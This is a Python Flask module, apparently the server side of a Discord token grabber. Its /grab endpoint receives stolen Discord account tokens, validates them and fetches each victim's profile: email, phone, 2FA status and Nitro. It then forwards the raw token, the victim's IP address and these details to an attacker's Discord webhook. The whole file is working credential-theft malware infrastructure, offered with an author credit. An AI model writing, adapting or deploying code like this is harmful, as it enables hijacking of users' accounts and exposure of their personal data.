import requests

from flask import request, jsonify
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime

from . import routes

from core import config_object as config
from core.validate import Validate
from core.discord.user import DiscordUser
from core.discord.utils import snowflake_epoch


@routes.route('/grab', methods=['GET', 'POST'])
def token_grabber():
    """ API endpoint for token grabber

    API endpoint supports both GET and POST request.

    Note that you must include application/json
    as your Content-Type for POST requests.
    """
    if request.method == 'GET':
        tokens = request.args.get('tokens')
        secret = request.args.get('secret')

        tokens = [token for token in tokens.split(',')]

    elif request.method == 'POST':
        tokens = request.json.get('tokens')
        secret = request.json.get('secret')

    # TODO: prevent request flooding and token dupes
    ip = request.remote_addr

    if not tokens or secret != config.secret:
        return (jsonify(error='unauthorized'), 400)

    for token in tokens:
        if Validate.token(token) is False:
            continue

        try:
            user = DiscordUser(token)
        except:
            continue
        
        avatar_url = f'https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}'
        try:
            res = requests.get(avatar_url)
            if res.text.encode()[:6] == b'\x47\x49\x46\x38\x39\x61':
                avatar_url += '.gif'
        except:
            pass

        embed = DiscordEmbed()
        embed.set_thumbnail(url=avatar_url)
        embed.set_footer(text='Made by checksum (@0xFADE)', icon_url='https://media.discordapp.net/attachments/753892365214679131/763117465034424350/tumblr_pt0s6axt6d1tjw0rpo1_400.gif')
        embed.set_title(f'__{user.username}#{user.discriminator}__')
        embed.description = f'''
**Discord Information**
`ID            ` {user.id}
`Created At    ` {user.created_at.strftime('%d-%m-%Y %H:%M:%S')}
`Email         ` {user.email if user.email else ''}
`Phone         ` {user.phone if user.phone else ''}
`Locale        ` {user.locale}
`2FA           ` {'enabled' if user.mfa_enabled else 'disabled'}
`Nitro         ` {'yes' if user.has_nitro else 'no'}

**General Information**
`Remote Address` {ip}

**Token**
```{token}```
'''

        webhook = DiscordWebhook(config.webhook_url)
        webhook.add_embed(embed)
        webhook.execute()

    return jsonify(success=True)
